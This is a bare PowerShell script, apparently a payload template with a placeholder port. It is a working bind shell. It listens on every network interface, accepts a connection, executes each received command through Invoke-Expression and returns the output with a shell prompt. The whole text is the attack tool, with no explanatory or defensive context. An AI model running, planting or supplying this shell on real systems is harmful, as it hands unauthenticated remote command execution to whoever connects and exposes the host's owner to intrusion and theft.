$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', §LPORT§);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while (($size = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
  $input = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $size);
  $output = ([text.encoding]::ASCII).GetBytes((iex $input 2>&1 | Out-String) + 'PS ' + (pwd).Path + '> ');
  $stream.Write($output, 0, $output.Length);
  $stream.Flush();
}
$client.Close();
$listener.Stop();
